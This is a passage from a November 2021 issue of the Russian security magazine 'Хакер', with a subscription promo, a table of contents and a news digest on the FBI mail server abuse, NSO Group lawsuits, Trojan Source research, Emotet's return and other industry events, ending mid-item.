
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                  Ноябрь 2021
            № 272
CONTENTS

    MEGANews
  Самые важные события в мире инфосека за ноябрь

     Android
  Уязвимости PendingIntent и трекинговые библиотеки

    WinAFL на практике
  Учимся работать фаззером и искать дыры в софте

    Уроки форензики
  Расследуем киберинцидент CyberCorp Case 1

    Вскрытие покажет
  Анализируем малварь в собственной лаборатории

    Грязный Джо
  Взламываем Java-приложения с помощью dirtyJOE

    HTB Intelligence
  Пентестим Active Directory от MSA до KDC

    HTB Explore
  Повышаем привилегии на Android через ADB

    HTB Pivotapi
  Большой пентест Active Directory

    HTB Seal
  Пентестим Apache Tomcat и эксплуатируем Ansible Playbook

    HTB BountyHunter
  Ломаем сайт на PHP через XXE и пентестим приложение на Python

    Мастерская хакера
  Подборка полезных инструментов для Windows и Linux

     Linux за 30 минут
  Руководство по выбору и использованию Linux для новичков

     Bluetooth для андроида
  Портируем с Linux на Android драйвер USB-адаптера

    Питоном по телеграму!
  Пишем пять простых Telegram-ботов на Python

    Змеиная почта
  Пишем на Python и Qt почтовик с возможностью прикреплять файлы

    Титры
  Кто делает этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: неизвестные взломали почтовый сервер
ФБР, компания Apple подала в суд на NSO Group, руководс‐
тво Facebook приняло решение отказаться от распознавания
лиц, ботнет Emotet заработал снова, GoDaddy опять ском‐
прометировали,  хакеры  пытаются  взломать  PlayStation
5 и еще много интересного.





ЛОМАЮТ ДАЖЕ ФБР
В середине ноября почтовый сервер Федерального бюро расследований
(ФБР) был взломан. Неизвестные хакеры использовали полученный доступ
для рассылки писем, которые имитировали предупреждения ФБР о кибера‐
таках и краже данных.
   Эксперты некоммерческой организации Spamhaus, занимающейся отсле‐
живанием спама, сообщили, что такие письма были доставлены десяткам
тысяч адресатов двумя волнами. При этом эксперты считают, что око‐
ло 100 тысяч писем — лишь небольшая часть  кампании. По данным
Spamhaus, сообщения приходили с легитимного адреса eims@ic.fbi.gov, с IP
153.31.119.142 (mx-east-ic.fbi.gov), а в теме письма значилось «Urgent: Threat
actor in systems» («Срочно: злоумышленник в системах»).





Известно, что  после этой  рассылки на офисы ФБР  обрушился шквал
телефонных звонков и сообщений от обеспокоенных представителей орга‐
низаций, которые хотели получить дополнительную информацию об атаках.
Хотя  письма явно были фейковыми  (например,  содержали  множество
орфографических  ошибок),  рассылка  посеяла  нешуточную  панику,  так
как письма прошли проверку безопасности SPF и DKIM, то есть были отправ‐
лены с реальных серверов ФБР и обошли все спам‑фильтры.
   Представители ФБР вскоре подтвердили факт взлома. Агентство заявило,
что уже проводится расследование инцидента, а скомпрометированный сер‐
вер временно отключен, чтобы остановить рассылку спама. Судя по всему,
хакеры воспользовались некой уязвимостью в программном обеспечении,
работающем на сервере, для отправки сообщений. При этом скомпромети‐
рованная машина была изолирована от корпоративной почты агентства и не
давала доступа к каким‑либо данным или личной информации в сети ФБР.
   Известный ИБ‑журналист Брайан Кребс пишет, что портал LEEP (Law
Enforcement Enterprise Portal) позволял любому подать заявку на получение
учетной записи, но при регистрации требовалось заполнить  контактную
информацию.

      «Важным шагом в этом процессе было то, что кандидаты получали
       подтверждение  с  одноразовым  паролем  по  электронной  почте,«
      с адреса eims@ic.fbi.gov. И этот код, а  также  контактные данные
       заявителя утекали через HTML-код страницы», — пишет Кребс.                »
В  итоге злоумышленники имели возможность с помощью специального
скрипта подменить параметры, указав тему и текст электронного письма
по своему выбору, и автоматизировать отправку сообщений.





В посланиях злоумышленников сообщалось, что ответственность за эти атаки
лежит на некоем Винни Трое (Vinny Troia). Троя — известный ИБ‑исследова‐
тель, который возглавляет изучение даркнета в компаниях Night Lion Security
и Shadowbyte.
   Троя сообщил в Twitter, что, по его мнению, случившееся — дело рук
человека, известного под ником pompompurin. В прошлом этот человек уже
был связан с инцидентами, направленными на подрыв репутации исследова‐



      «В последний раз они [pompompurin] взломали национальный центр
       пропавших без вести детей и разместили пост в блоге, сообщив, чтотеля.«
      я педофил», — рассказал СМИ Троя.                »
Более того, за несколько часов до атаки на почтовый сервер ФБР и рассылки
спама pompompurin связался с исследователем в Twitter и посоветовал «нас‐
лаждаться» тем, что произойдет в скором времени.


ИЗРАИЛЬ ЗАПРЕТИЛ ЭКСПОРТ КИБЕРОРУЖИЯ
В 65 СТРАН

Правительство Израиля ограничило список стран, в которые местным ИБ‑компаниям раз‐
решено продавать инструменты для шпионажа и взлома. Список сократился почти на две тре‐
ти, и теперь экспорт таких решений разрешен лишь в 37 стран мира.

В новый перечень входят только демократические страны, в том числе страны ЕС и коалиции
Five Eyes. То есть оказались исключены все авторитарные режимы, которым израильские ком‐
пании (такие как Candiru и NSO Group) ранее поставляли инструменты для слежки.


Ожидается, что ограничения на экспорт нанесут ощутимый ущерб израильскому рынку шпи‐
онского ПО, который оценивается в 10 миллиардов долларов. Согласно свежему отчету
Атлантического совета НАТО, количество компаний, которые продают инструменты для слежки
и взлома, равняется 224, из них в Израиле находятся 27.





БЕТА НОВОГО
WINAMP
Несколько лет назад мы писали о том, что нынешние владельцы легендарно‐
го медиаплеера Winamp готовятся к его обновлению и перезапуску.
   Напомню, что Winamp проделал долгий путь и не раз переходил от одной
компании к другой. Так, компанию  Nullsoft, исходно создавшую Winamp,
еще в 1999 году приобрела AOL, которая и поддерживала плеер на протяже‐
нии долгих лет. Затем в 2013 году разработку программы, уже растерявшей
немалую долю своей популярности, решили прекратить, сайт winamp.com
закрылся (последней версией стала 5.666), а права на Winamp в 2014 году
выкупила бельгийская компания Radionomy, занимающаяся интернет‑ради‐
овещанием.
  С тех пор никаких новостей о медиаплеере практически не поступало.
Лишь осенью 2018 года представители Radionomy сделали неожиданное
заявление и сообщили, что в 2019 году Winamp преобразится, станет лучше
и вернется в строй. Разработчики заявляли, что намерены сделать Winamp
универсальным решением для прослушивания всего — подкастов, радио,
плей‑листов и так далее.

     «Вы сможете слушать MP3, которые есть у вас дома, но также смо-
      жете   пользоваться  облаком,   подкастами,  стриминговым  радио«
      и  плей‑листами. Людям  нужен  единый  опыт,  и  я  считаю,  что
     Winamp — идеальный плеер для всех. Мы хотим, чтобы люди поль-
      зовались им на всех своих устройствах», — рассказывал тогда изда-
     нию TechCrunch  глава Radionomy Александр Сабунджан (Alexandre
       Saboundjian).                »
Кроме того, в сентябре 2018 года пользователи обнаружили в сети утекшую
бета‑версию Winamp 5.8, где были исправлены некоторые баги и появилась
поддержка Microsoft Audio. Тогда было не совсем ясно, откуда взялась новая
версия и кто стоял за ее разработкой. Но вскоре Сабунджан прояснил, что
над Winamp 5.8 работала Radionomy и новая версия содержит исправления
для различных багов, в том числе касающихся совместимости с Windows 10.
Из медиаплеера также убрали все платные функции, внедренные в Winamp
ранее.
  К сожалению, обещанного релиза обновленного Winamp в 2019 году поль‐
зователи так и не дождались, версия Winamp 5.8 по‑прежнему остается
самой новой, но, похоже, еще не все потеряно. В ноябре 2021 года сайт
Winamp.com претерпел кардинальный редизайн, и на нем был представлен
новый логотип медиаплеера.
   Кроме того, теперь на winamp.com можно зарегистрироваться для участия
в бета‑тестировании нового Winamp, которое обещают начать совсем скоро.





Пока никаких подробностей о возродившемся медиаплеере нет, но руково‐
дитель отдела разработки Winamp Джереми Шепперс подтвердил изданию
Bleeping Computer, что обновление сайта не чья‑то шутка, и сказал, что в ком‐
пании очень рады перезапуску приложения.


70% МОШЕННИЧЕСКИХ ЗВОНКОВ ПОСТУПАЮТ ИЗ-ЗА
РУБЕЖА
В интервью «Известиям» зампред правления Сбера Станислав Кузнецов рассказал, что доля
мошеннических звонков из‑за рубежа достигла 70%, при этом наибольшее число подпольных
кол‑центров находится в украинском городе Днепр.





         «Еще два года назад 40% мошеннических звонков россиянам действительно→        осуществлялись из мест лишения свободы на территории РФ, еще 40% — из‑за
      рубежа и оставшиеся 20% — из российских городов. Сейчас доля мошенничес‐
       ких звонков из‑за рубежа достигла 70%, при этом такие кол‑центры „работают“
        исключительно по гражданам России.
           Главный источник звонков — территория Украины, еще конкретнее — город
       Днепр, бывший Днепропетровск. Там большое количество русскоговорящей
       молодежи,  а  возможностей  честного  заработка,  очевидно,  не  хватает.
      Еще недавно в Днепре могло действовать до 1000 мошеннических кол‑цен‐
       тров — только вдумайтесь в эту цифру! Однако за последний год их число сок‐
       ратилось до 150»


— из интервью Кузнецова





APPLE VS NSO GROUP
Компания Apple подала иск против израильской фирмы NSO Group, стоящей
за разработкой известной шпионской платформы Pegasus, способной ском‐
прометировать даже самые безопасные и современные iPhone. Предста‐
вители Apple заявили, что этот инструмент неоднократно использовался
для взлома устройств и слежки за противниками репрессивных режимов.


       «Исследователи и журналисты публично задокументировали историю
      использования этого шпионского ПО для преследования журналистов,«
        активистов, диссидентов, ученых и правительственных чиновников», —
       гласит официальный пресс‑релиз компании.                »
В настоящее время Apple добивается судебного запрета против NSO Group
и просит суд запретить компании использование ее устройств и программно‐
го обеспечения. С юридической точки зрения такой запрет может помочь
предотвратить развертывание Pegasus на новых устройствах Apple, а также
помешает сотрудникам NSO Group обновлять спайварь для новых версий
iOS.
   Нужно отметить, что Apple — уже вторая крупная компания, которая
подала иск против NSO Group. В октябре 2019 года Facebook также об‐
ратилась  в  суд  из‑за  создания  и  использования   0-day-эксплоита
для WhatsApp.
   Уязвимость в WhatsApp, как утверждает Facebook, была продана NSO
Group, а затем компания помогала своим клиентам эксплуатировать эту
проблему для атак на правозащитников, журналистов, политических дис‐
сидентов, дипломатов и  правительственных  чиновников.  Считается,  что
в  общей   сложности  за   одиннадцать  дней   от   атак   пострадали
более 1400 человек в Бахрейне, Объединенных Арабских Эмиратах и Мек‐
сике.
   Более того, тогда Facebook забанила сотрудников NSO Group на своих
платформах, так как судебный иск предусматривал постоянный судебный
запрет, не позволяющий всем сотрудникам NSO Group получать или пытаться
получить доступ к службам, платформе и компьютерным системам WhatsApp
и Facebook.
  В иске Apple тоже сказано, что NSO Group продала 0-day-уязвимость сом‐
нительным клиентам, которые затем использовали баг, чтобы взломать
устройства ни в чем не повинных людей, включая адвокатов, журналистов,
правозащитников, политических диссидентов, дипломатов и правительствен‐
ных чиновников.
  В частности, Apple упоминает о проблеме ForcedEntry, которую эксперты
обнаружили в этом году. В отчете компании Citizen Lab, нашедшей и изучив‐
шей этот эксплоит, говорилось, что проблема нулевого дня, похоже, была
продана  правительству  Бахрейна, а затем использовалась для  взлома
устройств диссидентов, блогеров и оппозиционеров.


       «Ответчики —  известные хакеры,  аморальные наемники  XXI  века,
      которые  создали  сложнейшие  механизмы  для  кибернаблюдения,«
      допускающие как рутинные, так и из ряда вон выходящие злоупот-
       ребления. Они  проектируют, разрабатывают, продают,  доставляют,
       развертывают,  эксплуатируют и  поддерживают  агрессивные,  раз-
      рушительные и вредоносные шпионские продукты и услуги, которые
      использовались для атак и нанесения вреда пользователям Apple,
       продуктам Apple и компании Apple. Ради собственной коммерческой
      выгоды они позволяют своим клиентам злоупотреблять этими продук-
      тами и  услугами,  атакуя  частных лиц, включая  правительственных
       чиновников, журналистов, бизнесменов,  активистов, ученых и даже
       граждан США», — заявляет Apple.
         «Наемные шпионские компании, такие как NSO Group, способство-
      вали самым серьезным нарушениям прав человека и репрессиям
      по всему миру, одновременно обогащая себя и своих инвесторов, —
       комментирует Рон Дейберт, глава Citizen Lab. — Я аплодирую Apple
      за то, что она привлекает их к ответственности за эти злоупотребле-
       ния, и надеюсь, что тем самым Apple поможет восстановить справед-
      ливость для всех, кто стал жертвой опрометчивого поведения NSO
      Group».                »
Apple заявила, что пожертвует 10 миллионов долларов, а также возместит
любые судебные издержки организациям, проводящим исследования инс‐
трументов для киберслежки. Поскольку Citizen Lab изобличила большую часть
шпионских кампаний с использованием Pegasus, Apple пообещала, что также
будет оказывать бесплатную поддержку исследовательской лаборатории,
которая работает при Школе глобальных отношений и государственной
политики имени Мунка при Университете Торонто.
   Интересно, что ранее в этом году правительство США наложило санкции
на израильскую компанию, и это эффективно мешает NSO Group сотрудни‐
чать с американскими компаниями. В итоге санкции принесли компании
большие проблемы, и сейчас она находится на грани закрытия.

      «Для меня  заявление  Apple —  это  чистый  оппортунизм.  Больше
      похоже на кампанию, направленную на поддержку хорошей стороны«
       исследовательского сообщества (пожертвования в размере 10 мил-
      лионов долларов США плюс покрытие любых судебных издержек), —
      заявил изданию The Record Стефан Соэсанто (Stefan Soesanto), стар-
     ший исследователь Центра безопасности Швейцарской высшей тех-
       нической школы в Цюрихе. — Meta и WhatsApp сделали всю тяжелую
      работу в своем судебном процессе против NSO, правительство США
       внесло NSO в черный список в начале текущего месяца, а теперь
      Apple может не прикладывать больших усилий.
       В целом, полагаю, все это скорее связано с попытками Apple сгла-
      дить и перенаправить разговоры о недостатках безопасности и кон-
       фиденциальности [в ее продуктах] в иное русло».                »

ЕЖЕГОДНАЯ СТАТИСТИКА GITHUB
Команда GitHub опубликовала ежегодный статистический отчет Octoverse, в котором раскрыла
разные аспекты собранной за год внутренней статистики сервиса.

За прошедший год аудитория GitHub выросла на 17 000 000 пользователей и теперь нас‐
читывает 73 000 000 человек.

Российских разработчиков стало на 33% больше: почти 2 000 000 в этом году против
1 500 000 в 2020 году.

В 2021 году пользователи создали 61 000 000 новых репозиториев (против 60 000 000
в 2020 году) и отправили более 170 000 000 pull-запросов. Общее число репозиториев
на платформе составляет 254 000 000.





Самым популярным языком программирования на GitHub по‑прежнему остается JavaScript.
Второе место занимает Python, третье место — Java.





TROJAN SOURCE
Ученые из Кембриджского университета Росс Андерсон и Николас Баучер
опубликовали информацию о концепте атаки Trojan Source (CVE-2021-42574),
которую можно использовать для внедрения вредоносного кода в легитим‐
ные приложения через поля комментариев. PoC-эксплоит уже доступен
на GitHub.
   Атака основана на использовании двунаправленных управляющих сим‐
волов в комментариях к исходному коду. Такие символы, известные как BiDi
(от английского bidirectional), представляют собой управляющие символы
Unicode, с помощью которых внутри текстовой строки уведомляют о переходе
от режима LTR (слева направо) к режиму RTL (справа налево) и наоборот.
На практике эти символы используются исключительно для программных при‐
ложений и невидимы человеку, поскольку применяются только для встраива‐
ния текста с другим направлением чтения в большие блоки текста (например,
для вставки строк на арабском или иврите).
   Исследователи обнаружили, что у большинства компиляторов и редак‐
торов кода нет протоколов для обработки символов BiDi или уведомлений
об их присутствии в комментариях к исходникам.
  По мнению специалистов, злоумышленники могут вставлять управляющие
символы BiDi в комментарии, которые люди не смогут увидеть, а при ком‐
пиляции они будут перемещать текст из поля комментария в исполняемый
код или перемещать код в комментарии, тем самым открывая приложения
для атак и обходя проверки безопасности.
   Также сообщается, что, помимо компиляторов, проблеме подвержены
несколько редакторов кода и хостинговых сервисов, перечисленные в таб‐
лице ниже.





Кроме того, по словам экспертов, компиляторы исходного кода уязвимы
перед еще одной проблемой (CVE-2021-42694), связанной с омоглифами.
Во время таких атак классические латинские буквы заменяются похожими
символами из других алфавитов. Исследователи пишут, что вторую атаку
можно использовать для создания двух разных функций, которые будут выг‐
лядеть одинаково в глазах человека, но на самом деле отличаются. Андерсон
и Баучер заявляют, что таким способом злоумышленник может скрытно
добавить вредоносный код в проект.





Исследователи резюмируют, что компиляторы и редакторы должны обна‐
руживать двунаправленные управляющие символы и омоглифы и обязатель‐
но сообщать о них людям.


«ЧЕРНАЯ ПЯТНИЦА»: НА 208% БОЛЬШЕ ФИШИНГА

Эксперты «Лаборатории Касперского» сообщили, что в преддверии сезона распродаж и «чер‐
ной пятницы» растет количество фишинговых атак в сфере онлайн‑платежей. Общее число
подобных  угроз  по  всему  миру  увеличилось  более  чем  в  3  раза  с  сентября
по октябрь 2021 года: рост составил 208%.

В целом в течение  первых десяти месяцев 2021 года компания  зафиксировала более
40 000 000 фишинговых атак на онлайн‑магазины и финансовые организации, когда мошен‐
ники маскировались под популярные крупные бренды, стремясь выманить деньги и данные
пользователей.





                                     Продолжение статьи →
← Начало статьи





 FACEBOOK ПРОТИВ
 РАСПОЗНАВАНИЯ
 ЛИЦ
   Компания Facebook объявила, что больше не будет использовать систему
   распознавания лиц (Face Recognition) на своей платформе и удалит соответс‐
   твующие профили, созданные ранее для миллиарда человек.
     Система Face Recognition анализировала фотографии, сделанные отме‐
   ченными пользователями, и фотографии профилей связанных с ними поль‐
   зователей, чтобы создать уникальный шаблон. Затем этот шаблон исполь‐
   зовался для идентификации пользователей на других загруженных фотог‐
   рафиях, а также автоматических тегов в Memories.
      Теперь, вскоре после своего ребрендинга в Meta, Facebook объявила, что
   отказывается от функции распознавания лиц и удалит шаблоны, созданные
   системой.


  РЕБРЕНДИНГ
  В октябре 2021 года социальная сеть сообщила о ребрендинге своей материнской компании,
   которая отныне будет называться Meta. Это название вдохновлено романом Нила Стивенсона
   «Лавина», где Метавселенной называется виртуальная реальность, охватывающая весь мир.
       Смена названия произошла на фоне недавней утечки внутренних документов Facebook,
   которые продемонстрировали ее многочисленные этические проблемы. В частности, выяс‐
   нилось, что компания знала о последствиях, возникающих при использовании ее платформы,
   включая распространение радикализирующей дезинформации, а также негативные последс‐
   твия для психического здоровья подростков‑пользователей.
      Марк Цукерберг заявил, что компания готова меняться и в будущем удвоит усилия по соз‐
   данию иммерсивного виртуального опыта.




         «Многие конкретные  случаи,  когда распознавание лиц может быть
         полезным,  необходимо  сопоставлять  с  растущими  опасениями «
        по поводу использования этой технологии в целом, — пишет Джером
          Пезенти, вице‑президент компании по искусственному интеллекту. —
          Существует много опасений о том, какое место должна занимать тех-
         нология распознавания лиц в обществе, и регулирующие органы все
       еще находятся в процессе разработки четкого набора правил, регули-
        рующих ее использование. В условиях продолжающейся неопределен-
         ности мы считаем целесообразным ограничение использования рас-
          познавания лиц узким набором сценариев».                 »
   Дело в том, что Facebook уже сталкивалась с юридическими последствиями
   подобных «опасений». Так, недавно компания выплатила 650 миллионов дол‐
  ларов в связи с коллективным судебным иском в штате Иллинойс. В иске
   утверждалось, что социальная сеть собирала и хранила биометрические дан‐
  ные пользователей без их согласия.





 ДЕФИЦИТ ЧИПОВ И НИКАКОГО ВОЛШЕБСТВА
   Выступая с докладом на конференции GTC NVIDIA, главный исполнительный директор Nvidia
   Дженсен Хуанг признал, что справиться с глобальным дефицитом чипов вряд ли получится
   в ближайшем будущем.
        Интересно, что эту точку зрения разделяет и глава Intel Пэт Гелсингер, который недавно
   заявил, что спрос и предложение придут в равновесие не раньше 2023 года.

            «Я полагаю, в следующем году спрос значительно превысит предложение. →         У нас нет никаких волшебных средств, чтобы справиться с [проблемами] цепоч‐
          ки поставок. Да, у нас есть поддержка наших поставщиков. Нам повезло, что мы
          используем  несколько  источников, наша  цепочка  поставок  разнообразна,
          а наша компания довольно велика, поэтому нас поддерживает огромная экосис‐
          тема»


  — сообщил Хуанг





 ВЗЛОМ PLAYSTATION
 5 СТАЛ БЛИЖЕ
   Участники известной хакерской группы Fail0verflow поделились в Twitter фраг‐
  ментом кода и сообщили, что им удалось добраться до всех корневых ключей
   PlayStation 5. Судя по всему, на опубликованном скриншоте показан рас‐
   шифрованный файл прошивки PS5, где выделен код, относящийся к безопас‐
  ному загрузчику (secure loader). В теории анализ расшифрованной прошивки
  поможет Fail0verflow (и другим хакерам) отреверсить код и создать кастомную
   прошивку с возможностью загрузки на PS5 стороннего ПО.





   Разумеется, для извлечения системного ПО PS5 и установки замены пот‐
   ребуется некий эксплоит, который обеспечит доступ на чтение/запись к обыч‐
  но закрытому ядру консоли. Пока участники Fail0verflow ничего не пишут
  о таком эксплоите, лишь отмечают, что ключи были «получены из програм‐
   много обеспечения», то есть для этого не потребовалось вмешательство
  на аппаратном уровне.
     Так как пока хакеры не раскрывают никаких подробностей своего взлома,
   в сети уже строят теории и активно обсуждают возможности, которые откры‐
   ваются после получения корневых ключей. К примеру, пользователи Reddit
   объясняют, что громкие заголовки СМИ о «взломанной PS5» не совсем кор‐



         «Говорят, они нашли ключи дешифрования. Корневые симметричные
          ключи. [Но] ключи дешифрования всегда симметричны, потому что нет   ректны.«
         смысла  использовать  систему  публичных/приватных  ключей, если
        ключ дешифрования всегда находится на устройстве (то есть обще-
          доступен). Расшифровка просто будет происходить медленнее, если
        вы  используете  PKI  [инфраструктуру  открытых  ключей] для шиф-
         рования/дешифрования (сокрытия).
            Код, разумеется, тоже подписан, и он будет использовать PKI,
        но приватный ключ не находится на устройстве и не может быть вос-
           становлен с устройства. Таким образом, должны существовать и „кор-
        невые асимметричные ключи“ (что‑то вроде), а их они не нашли, так
          как их вообще нет на устройстве.
         С помощью этого взлома они сумеют расшифровать игры и рас-
         шифровать другие вещи, зашифрованные на устройстве (файлы сох-
        ранений и  так  далее). Но они не  смогут  подписать новый  код.
        Для запуска нового кода в системе потребуется еще один экспло-
           ит», — объясняет на Reddit пользователь happyscrappy.                 »
   Также стоит отметить, что недавно другой известный хакер, theFlow0, про‐
   демонстрировал в Twitter скриншот, на котором среди обычных настроек
   PlayStation 5 присутствует параметр Debug Settings, ранее доступный только
  на оборудовании для разработчиков (где GUI выглядит совсем иначе).
      Тогда издание Wololo  поясняло, что скриншот theFlow0 был  сделан
  на обычной PS5 и опубликован с помощью функции PS5Share PS5. Это сви‐
   детельствует о том, что у хакера есть произвольный доступ на запись, то есть,
   скорее всего, у него есть и эксплоит для ядра PS5. При этом theFlow0 нед‐
   вусмысленно дал понять, что не планирует выпускать эксплоит в открытый
   доступ и раскрывать какие‑либо детали.


 САМЫЕ АКТИВНЫЕ ШИФРОВАЛЬЩИКИ

   Компания Group-IB составила список самых агрессивных программ‑вымогателей, которые
   в 2020–2021 годах работали на территории России. Ими оказались операторы шифроваль‐
   щиков Dharma, Crylock, Thanos — каждый из них совершил более 100 атак на российский
    бизнес. В общей сложности на них приходится более 300 атак.





  В уходящем году количество атак программ‑вымогателей в России увеличилось более чем
   на 200%.

   Суммы выкупа, которые злоумышленники требуют от своих жертв в России, зависят как от
   величины бизнеса, так и от аппетитов самих атакующих. Средняя сумма выплаченного выкупа
    составляет 3 000 000 рублей, максимальная — 40 000 000 рублей.

   Рекорд по максимальной сумме запрашиваемого выкупа в 2021 году поставила группировка
   OldGremlin — они рассчитывали получить от жертвы 250 000 000 рублей.

   Самым популярным способом проникновения шифровальщиков в сети российских организаций
    стала компрометация по протоколу RDP. В текущем году такие атаки составляли до 60%
   от общего числа.





 NINTENDO ЗАСУДИЛА
 МОДДЕРА
  В прошлом году в Доминиканской Республике был арестован (и вскоре экс‐
   традирован в США) 51-летний канадец Гэри «GaryOPA» Баузер (Gary Bowser).
  Он был членом группы Team Xecuter, которая предлагала людям аппаратные
  и программные решения, позволявшие устанавливать на различные консоли
   (включая популярную Nintendo Switch) неофициальные и пиратские копии игр.
  Теперь Баузер признал себя виновным.
      Баузер работал над известной линейкой SX OS для моддинга устройств
   Switch, а также занимался разработкой других инструментов, позволявших
   пользователям играть в пиратские ROM. Баузер признал себя виновным
  по двум из одиннадцати пунктов обвинения, связанных с торговлей устрой‐
   ствами для обхода защиты, и в сговоре с той же целью. Вместе два этих
   обвинения предусматривают максимальное наказание в виде десяти лет
  лишения свободы. Взамен на признание вины прокуратура согласилась снять
   остальные девять обвинений.
     Как гласит подписанное Баузером соглашение, моддер признает, что
   в период с июня 2013 года и вплоть до ареста в прошлом году он «сознатель‐
  но и умышленно участвовал в киберпреступной деятельности по взлому
  ведущих игровых консолей, в рамках которой разрабатывались, произво‐
  дились и продавались различные устройства для обхода защиты, позволяв‐
  шие клиентам [моддеров] играть в пиратские версии видеоигр, защищенных
   авторским правом».
      Также Баузер признает, что моддеры стремились «скрыть свою незакон‐
  ную деятельность за предполагаемым желанием поддержать доморощенных
   энтузиастов, которые хотели разрабатывать собственные игры». Группа под‐
   держивала и движение за право на ремонт, однако их продукты также поз‐
  воляли пользователям играть в пиратские игры.
    В ответ на старания моддеров компания Nintendo обновила аппаратную
   составляющую Switch, стремясь помешать взломам, но Team Xecute создала
   специальные устройства, которые можно было припаять к внутренней плате
   Switch, гласят судебные документы. Примеры таких девайсов можно увидеть
  ниже.





   Кроме того, сообщается, что устройства моддеров «незаметно и без авто‐
   ризации получали доступ к серверам Nintendo и экосистеме онлайн‑игр»,
   используя легитимные серверы Nintendo для своих целей.
      Согласно судебным документам, успех таких устройств, как Gateway 3DS,
   Stargate, TrueBlue Mini, Classic2Magic, а также линейки SX OS «зависел в пер‐
  вую очередь от наличия пиратских ROM». Баузер признает, что он и другие
   участники Team Xecuter «создавали и поддерживали библиотеки ROM», чтобы
   пользователи   могли   обращаться   к   ним   через   такие    сайты,
   как MaxConsole.com и rom-bank.com.
    По оценкам самого Баузера, Team Xecuter получила «десятки миллионов
   долларов выручки» от продаж своих устройств и ПО с 2013 года. Наиболее
   доходной была именно SX OS, позволявшая использовать Nintendo Switch
  с кастомной прошивкой и играть в пиратские игры. Впрочем, Баузер лично
   заработал только 320 тысяч долларов, получая прямые платежи от Team
   Xecuter и долю с рекламных продаж на различных сайтах, которые он контро‐
   лировал.
     Тем не менее в рамках соглашения Баузер выплатит компании Nintendo
  4 500 000 долларов, чтобы компенсировать часть убытков от деятельности
  Team Xecuter, которые, по официальной версии, составляют от 65 до 150 мил‐
  лионов долларов.


  ПЕРЕХОД НА TOR V3
    Недавно Tor Project закончил поддержку 16-символьных доменов в зоне .onion, также извес‐
   тных как адреса v2, и заменил их доменами длиной 56 символов, известными как v3. Иссле‐
   дователи компании DarkOwl подсчитали, сколько сайтов уже перешли на новый стандарт.


   Увы, несмотря на то, что к этому моменту разработчики Tor Project готовились долго, сеть Tor
   по‑прежнему состоит в основном из серверов, на которых работают старые домены v2. За пос‐
   ледние шесть недель платформа DarkOwl Vision фиксировала в среднем 104 095 активных сер‐
   висов .onion, работающих по обоим стандартам, из которых 62% — адреса v2, а 38% — адре‐
   са v3.


    Исследователи ожидают, что сайты v2 окончательно исчезнут не раньше, чем в следующем
   году.





 EMOTET ВЕРНУЛСЯ
  В январе текущего года Европол, ФБР и правоохранительные органы многих
  стран мира, включая Канаду, Нидерланды, Францию, Германию,  Литву,
  Великобританию и Украину, провели масштабную скоординированную опе‐
  рацию по ликвидации ботнета Emotet, подготовка к которой длилась два года.
      Тогда правоохранителям удалось захватить контроль над инфраструктурой
   Emotet, нарушив ее работу. В итоге преступники лишились возможности
   использовать взломанные машины, а малварь прекратила распространяться
  на новые цели.
      Более того, эксперты использовали свой доступ к управляющим серверам
   Emotet, которые оказались под контролем Федерального ведомства уголов‐
  ной полиции Германии (Bundeskriminalamt), для развертывания специального
   обновления на всех зараженных хостах. Специальный модуль для Emotet,
   созданный специалистами Bundeskriminalamt, был распространен на все
   зараженные  системы  в  виде  32-разрядного  файла  EmotetLoader.dll.
  Это обновление содержало «бомбу замедленного действия»: весной текуще‐
   го года механизм привел к удалению Emotet со всех зараженных машин. Фак‐
   тически ботнет был уничтожен.

        «На протяжении долгого времени Emotet был нашей угрозой номер
         один, и его устранение будет иметь большое значение. Emotet учас- «
           твует в 30% всех атак вредоносного ПО, так что его успешная лик-
        видация окажет большое влияние на всю криминальную среду», —
         говорил тогда руководитель операций Европейского центра по борьбе
         с киберпреступностью Фернандо Руис (Fernando Ruiz).                 »
   Теперь, спустя десять месяцев после операции по ликвидации ботнета,
   исследователи вновь обнаружили активность малвари. ИБ‑исследователь
  Лука Эбах (Luca Ebach) сообщил, что другой ботнет, TrickBot, помогает опе‐
   раторам Emotet встать на ноги, устанавливая малварь Emotet в системы, уже
   зараженные самим TrickBot.
    Один из энтузиастов из группы Cryptolaemus, в которую входят более
   двадцати ИБ‑специалистов со всего мира, еще в 2018 году объединившихся
  ради общей цели — борьбы с малварью Emotet, сообщил, что в прошлом,
   когда еще Emotet распространял TrickBot, а не наоборот, эту активность
   называли ReachAround. По сути, это означает, что Emotet перестраивается
  с использованием инфраструктуры TrickBot.


        «Они уже делали так раньше, и мы знали, что для них это может стать
         способом вернуться», — говорит эксперт. «                 »
   Напомню, что исследователи Cryptolaemus сыграли решающую роль в отсле‐
   живании ботнета и активно помогали правоохранительным органам в унич‐
  тожении Emotet. В этой связи интересен тот факт, что новые версии Emotet
   появились практически одновременно с трехлетним юбилеем Cryptolaemus,
   хотя неясно, была ли это случайность, или операторы Emotet действительно
   передали исследователям своеобразный привет.
    На скриншоте, предоставленном СМИ членом Cryptolaemus, Abuse.ch,
  показан период бездействия Emotet (с января по ноябрь 2021 года), а также
  момент, когда хакеры развернули новые управляющие серверы.


                                        Продолжение статьи →
← Начало статьи





  По данным Cryptolaemus, операторы Emotet не сразу перешли к рассылке
   спама по электронной почте. Вместо этого они положились на помощь груп‐
   пировки TrickBot, которая помогла им восстановить «фундамент» ботнета,
   прежде чем тот снова перейдет к спам‑кампаниям.
      Исследователи отмечают, что Emotet будет непросто достичь прежних
   размеров в ближайшие месяцы, однако малварь остается очень сложной
  и эффективной угрозой, которую нельзя игнорировать. Новая инфраструк‐
   тура Emotet растет достаточно быстро: более 246 зараженных устройств уже
   действуют как C&C-серверы.


  АТАКИ НА РОССИЙСКИЕ КОМПАНИИ
   Компания Positive Technologies провела анонимный опрос среди ИБ‑специалистов компаний
